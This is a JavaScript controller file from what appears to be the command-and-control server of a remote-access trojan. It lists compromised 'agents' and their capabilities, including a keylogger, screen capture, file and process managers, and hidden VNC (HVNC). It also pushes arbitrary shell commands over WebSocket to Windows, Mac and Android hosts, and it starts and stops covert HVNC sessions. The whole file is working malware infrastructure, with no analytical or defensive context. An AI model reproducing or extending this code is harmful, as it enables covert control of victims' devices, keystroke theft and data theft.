const Client = require('../models/Client');
const catchAsync = require('../utils/catchAsync');
const AppError = require('../utils/appError');

/**
 * Get all agents with filtering options
 */
exports.getAllAgents = catchAsync(async (req, res, next) => {
  const { platform, status, feature } = req.query;
  
  // Build filter object
  const filter = {};
  
  if (platform) {
    filter.operatingSystem = platform;
  }
  
  if (status === 'online') {
    // Consider clients active if heartbeat within last 5 minutes
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    filter.lastHeartbeat = { $gte: fiveMinutesAgo };
  } else if (status === 'offline') {
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    filter.lastHeartbeat = { $lt: fiveMinutesAgo };
  }
  
  if (feature) {
    filter['capabilities.features'] = feature;
  }
  
  const agents = await Client.find(filter).select('-authToken');
  
  // Transform data for frontend
  const transformedAgents = agents.map(agent => {
    const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
    
    return {
      id: agent._id,
      name: agent.computerName,
      ip: agent.ipAddress,
      platform: agent.operatingSystem,
      status: isOnline ? 'Online' : 'Offline',
      lastSeen: agent.lastHeartbeat,
      version: agent.osVersion || 'Unknown',
      features: {
        hvnc: agent.capabilities.features.includes('hvnc'),
        keylogger: agent.capabilities.features.includes('keylogger'),
        screenCapture: agent.capabilities.features.includes('screenCapture'),
        fileManager: agent.capabilities.features.includes('fileManager'),
        processManager: agent.capabilities.features.includes('processManager')
      }
    };
  });
  
  res.status(200).json({
    status: 'success',
    results: transformedAgents.length,
    data: {
      agents: transformedAgents
    }
  });
});

/**
 * Get a single agent by ID
 */
exports.getAgent = catchAsync(async (req, res, next) => {
  const agent = await Client.findById(req.params.id);
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
  
  const transformedAgent = {
    id: agent._id,
    name: agent.computerName,
    ip: agent.ipAddress,
    platform: agent.operatingSystem,
    status: isOnline ? 'Online' : 'Offline',
    lastSeen: agent.lastHeartbeat,
    version: agent.osVersion || 'Unknown',
    features: {
      hvnc: agent.capabilities.features.includes('hvnc'),
      keylogger: agent.capabilities.features.includes('keylogger'),
      screenCapture: agent.capabilities.features.includes('screenCapture'),
      fileManager: agent.capabilities.features.includes('fileManager'),
      processManager: agent.capabilities.features.includes('processManager')
    },
    systemInfo: agent.systemInfo || {}
  };
  
  res.status(200).json({
    status: 'success',
    data: {
      agent: transformedAgent
    }
  });
});

/**
 * Send command to agent
 */
exports.sendCommand = catchAsync(async (req, res, next) => {
  const { command, params = {} } = req.body;
  const agentId = req.params.id;
  
  const agent = await Client.findById(agentId);
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  // Check if agent is online
  const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
  if (!isOnline) {
    return next(new AppError('Agent is offline and cannot receive commands', 400));
  }
  
  // Generate command ID
  const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

  // Get WebSocket connection for this client
  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);

  if (!clientConnection) {
    return next(new AppError('Client WebSocket connection not found', 400));
  }

  // Prepare command payload based on platform (Qt client expects 'cmd' and 'taskId')
  let commandPayload = {
    cmd: 'execute',
    taskId: commandId,
    command: command,
    params: params,
    timestamp: new Date().toISOString()
  };

  // Platform-specific command formatting
  switch (agent.operatingSystem) {
    case 'windows':
      commandPayload.shell = 'cmd';
      break;
    case 'mac':
      commandPayload.shell = 'bash';
      break;
    case 'android':
      commandPayload.shell = 'sh';
      break;
    default:
      commandPayload.shell = 'sh';
  }

  // Send command to client via WebSocket
  try {
    console.log('Sending command to client:', commandPayload);
    clientConnection.send(JSON.stringify(commandPayload));
    
    // Store command in database for tracking
    await Client.findByIdAndUpdate(agentId, {
      $push: {
        commandHistory: {
          id: commandId,
          command: command,
          params: params,
          timestamp: new Date(),
          status: 'sent'
        }
      }
    });

    console.log('Command sent successfully to client:', agent.uuid);

    res.status(200).json({
      status: 'success',
      message: `Command "${command}" sent to agent`,
      data: {
        commandId: commandId,
        agentId,
        command,
        params,
        status: 'sent'
      }
    });
  } catch (wsError) {
    console.error('Failed to send command to client:', wsError);
    return next(new AppError('Failed to send command to agent', 500));
  }
});

/**
 * Start HVNC session
 */
exports.startHvncSession = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const { quality = 'medium', fps = 15 } = req.body;
  
  const agent = await Client.findById(agentId);
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  // Check if agent is online
  const isOnline = new Date(agent.lastHeartbeat) > new Date(Date.now() - 5 * 60 * 1000);
  if (!isOnline) {
    return next(new AppError('Agent is offline and cannot start HVNC session', 400));
  }
  
  // Check if agent supports HVNC
  if (!agent.capabilities.features.includes('hvnc')) {
    return next(new AppError('Agent does not support HVNC', 400));
  }
  
  // Get WebSocket connection
  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);
  
  if (!clientConnection) {
    return next(new AppError('Client WebSocket connection not found', 400));
  }
  
  // Generate session ID
  const sessionId = `hvnc_${agent.uuid}_${Date.now()}`;
  
  // Send HVNC start command to client
  const hvncCommand = {
    type: 'hvnc_start',
    sessionId,
    settings: {
      quality,
      fps: parseInt(fps),
      compression: quality === 'high' ? 'low' : 'high'
    }
  };
  
  try {
    clientConnection.send(JSON.stringify(hvncCommand));
    
    // Update agent with HVNC session info
    await Client.findByIdAndUpdate(agentId, {
      $set: {
        hvncSession: {
          sessionId,
          status: 'starting',
          quality,
          fps: parseInt(fps),
          startedAt: new Date()
        }
      }
    });
    
    res.status(200).json({
      status: 'success',
      message: 'HVNC session starting',
      data: {
        sessionId,
        agentId,
        quality,
        fps: parseInt(fps),
        status: 'starting'
      }
    });
  } catch (wsError) {
    return next(new AppError('Failed to communicate with agent', 500));
  }
});

/**
 * Stop HVNC session
 */
exports.stopHvncSession = catchAsync(async (req, res, next) => {
  const agentId = req.params.id;
  const { sessionId } = req.body;
  
  const agent = await Client.findById(agentId);
  
  if (!agent) {
    return next(new AppError('No agent found with that ID', 404));
  }
  
  // Get WebSocket connection
  const wsHandler = require('../configs/ws.handler');
  const clientConnection = wsHandler.getClientConnection(agent.uuid);
  
  if (clientConnection && agent.hvncSession) {
    // Send HVNC stop command to client
    const hvncCommand = {
      type: 'hvnc_stop',
      sessionId: agent.hvncSession.sessionId
    };
    
    try {
      clientConnection.send(JSON.stringify(hvncCommand));
    } catch (wsError) {
      console.error('Failed to send HVNC stop command:', wsError);
    }
  }
  
  // Clear HVNC session info
  await Client.findByIdAndUpdate(agentId, {
    $unset: { hvncSession: 1 }
  });
  
  res.status(200).json({
    status: 'success',
    message: 'HVNC session stopped',
    data: {
      sessionId: sessionId || (agent.hvncSession && agent.hvncSession.sessionId) || Date.now().toString(),
      agentId,
      status: 'disconnected'
    }
  });
});